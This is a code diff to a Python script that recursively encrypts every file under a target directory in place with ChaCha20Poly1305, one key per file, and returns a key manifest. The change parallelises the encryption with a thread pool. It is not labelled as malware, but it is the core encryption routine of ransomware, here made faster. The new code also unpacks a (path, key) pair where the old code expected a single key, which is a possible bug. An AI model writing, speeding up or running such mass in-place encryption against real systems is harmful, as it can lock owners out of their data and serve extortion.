@@ -22,6 +22,8 @@
 
 import os
 from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+import concurrent.futures
+
 
 
 
@@ -122,22 +124,38 @@ def encrypt_file_in_place(filepath, chunk_size=64 * 1024):
 
 
 
-def traverse_and_encrypt(directory):
+def traverse_and_encrypt(directory,max_workers=4):
     """Recursively walks a directory to encrypt files in-place and returns key mappings."""
-    key_manifest = {}
+    file_list = []
     
+    # Discovery Phase: Walk the directory sequentially to find targets safely
     def traverse(current_dir):
-        with os.scandir(current_dir) as entries:
-            for entry in entries:
-                if entry.is_dir(follow_symlinks=False):
-                    traverse(entry.path)
-                elif entry.is_file():
-                    # Generate a key and encrypt the file
-                    file_key = encrypt_file_in_place(entry.path)
-                    if file_key:
-                        key_manifest[entry.path] = file_key
+        try:
+            with os.scandir(current_dir) as entries:
+                for entry in entries:
+                    if entry.is_dir(follow_symlinks=False):
+                        traverse(entry.path)
+                    elif entry.is_file():
+                        file_list.append(entry.path)
+        except PermissionError:
+            print(f"Permission denied accessing directory: {current_dir}")
 
     traverse(directory)
+    
+    key_manifest = {}
+    
+    # Execution Phase: Distribute discovered files across the thread pool
+    print(f"Starting concurrent processing with {max_workers} threads across {len(file_list)} files...")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all tasks to the pool
+        future_to_file = {executor.submit(encrypt_file_in_place, path): path for path in file_list}
+        
+        # Collect results as they finish
+        for future in concurrent.futures.as_completed(future_to_file):
+            path, file_key = future.result()
+            if file_key:
+                key_manifest[path] = file_key
+                
     return key_manifest
 
 
@@ -146,7 +164,7 @@ if __name__ == "__main__":
     target_directory = TARGET_DIR
     
     # Run the traversal and collect encryption keys
-    all_keys = traverse_and_encrypt(target_directory)
+    all_keys = traverse_and_encrypt(target_directory,max_workers=4)
     
     # Display keys (In production, save these to a secure, external location)
     print("\nEncryption Key Manifest Summary:")
